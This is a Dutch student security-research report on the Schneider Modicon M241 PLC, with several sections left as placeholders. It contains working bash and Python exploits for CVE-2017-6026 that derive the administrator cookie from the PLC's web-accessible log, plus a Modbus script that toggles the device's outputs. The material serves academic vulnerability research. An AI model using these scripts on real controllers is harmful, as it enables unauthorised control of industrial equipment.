# Schneider M241 #

![Schneider M241](https://media.rs-online.com/t_large/R8066799-01.jpg)

Project door: Matti Bijnens, Remco Hofman, Stan van Wieringen

|                   |                                                 |
| ----------------- | ----------------------------------------------- |
| Afstudeerrichting | Computer & Cyber Crime Professional             |
| Module            | Project IV (CCCP)                               |
| Opdracht          | Onderzoeken naar zwakheden in de Schneider M241 |
| Lectoren          | Tijl Deneut, Hendrik Derre                      |
| Academiejaar      | 2018-2019                                       |

## Woord vooraf ##

Voor ons security-project onderzoek kregen we de kans om met echte industriële hardware te werken. Meer specifiek hebben wij gewerkt met de Schneider Modicon M241 en de bijbehorende software. Dit verslag is het resultaat van ons onderzoek en bevindingen.

Graag danken wij onze lectoren voor het mogelijk maken van dit onderzoek en het ter beschikking stellen van de nodige apparatuur.

Matti Bijnens, Remco Hofman, Stan van Wieringen

## Samenvatting ##

We hebben onderzoek gedaan naar vulnerabilities in de Schneider Modicon M241 software. Alles wat te maken heeft met het flashen, programeren en commands sturen naar de PLC via de "SoMachine" software.

Ook hebben wij met behulp van Wireshark de communicatie tussen de PLC en SoMachine onderschept en pogingen gedaan om het protocol te analyseren. We botsten tegen een muur toen we zagen dat we meerdere PLC's nodig hadden om hierin verder te geraken.

## Inhoudsopgave ##

<!-- toc -->

- [Verklarende woordenlijst](#verklarende-woordenlijst)
- [Intro](#intro)
- [Verderzetting onderzoek vorig jaar](#verderzetting-onderzoek-vorig-jaar)
- [Protocol](#protocol)
  * [Ping command](#ping-command)
  * [Discovery protocol](#discovery-protocol)
  * [Start/stop command](#startstop-command)
- [Decompile](#decompile)
- [Action log](#action-log)
- [Trello](#trello)
- [Besluit](#besluit)
- [Bronnen](#bronnen)
- [Tools](#tools)

<!-- tocstop -->

## Verklarende woordenlijst ##

| woord     | betekenis |
| --------- | --------- |
| PLC       |           |
| SoMachine |           |

## Intro ##

...

## Verderzetting onderzoek vorig jaar ##

Vorig jaar werd een fout gevonden in de generatie van de cookie.

Als POC schreven we snel een shellscript om deze zwakte uit te buiten.

``` bash
#!/bin/bash

# Exploits CVE-2017-6026 to calculate the administrator's cookie from accessible log files.
# Usage: ./CVE-2017-6026.sh [ADDRESS]

echo "M258_LOG=Administrator:\
$(wget -qO- ${1}/usr/Syslog/PlcLog.txt\
| grep "Network interface * registered"\
| tail -n1\
| cut -d',' -f1)"
```

Als uitbreiding schreven we ook een Python script om cross-platform te werken.

``` python
#!/usr/bin/python3
import re
import sys
from urllib.request import urlretrieve
import urllib.error


def printhelp():
    helpmsg = 'USAGE: {} HOST\n\n  Version: 0.1\n  About: A tool to help exploit CVE-2017-6026\n'.format(
        sys.argv[0])
    print(helpmsg)


def findinterfaceregister(file: str = 'PlcLog.txt'):
    last = ''
    for line in open(file, 'r'):
        if re.search('Network interface <interface>USB</interface> registered', line):
            last = line
    return last


def getlogdate(line: str):
    return line.split(',')[0]


def buildcookie(t: str, user: str = 'Administrator'):
    return '{}:{}'.format(user, t)


def main():
    try:
        if sys.argv[1].lower() in ['-h', '--help']:
            printhelp()
            exit(1)
        url = 'http://{}/usr/Syslog/PlcLog.txt'.format(sys.argv[1])
    except (ValueError, IndexError):
        printhelp()
        exit(1)

    urlretrieve(url, 'PlcLog.txt')
    line = findinterfaceregister()
    t = getlogdate(line)
    print(buildcookie(t))


if __name__ == '__main__':
    main()
```

## Protocol ##

### Schneider Protocol ###
#### Ping command ####

...

#### Discovery protocol ####

...

#### Start/stop command ####

...

### modbus ###

We found some weird behavior when sending modbus commands to the PLC. The device only executes modbus commands when in **STOP mode**.
We wrote a script that flashes the output leds one by one.

``` python
from pymodbus.client.sync import ModbusTcpClient
import time

client = ModbusTcpClient('172.20.3.40')
client.write_coil(1, True)
wait = 0.2
min = 4
max = 16
incr = 4
cur_relay = min
coil_amount=4
while True:
    client.write_coils(cur_relay, [True]*coil_amount)
    time.sleep(wait)
    client.write_coils(cur_relay, [False]*coil_amount)
    time.sleep(wait)
    cur_relay += incr
    if cur_relay >= max:
        cur_relay = min
```
## Decompile ##

Matti

## Action log ##

| datum | log |
| ----- | --- |

## Trello ##

plz help

## Besluit ##

...

## Bronnen ##

link bronnen hier

## Tools ##

link tools hier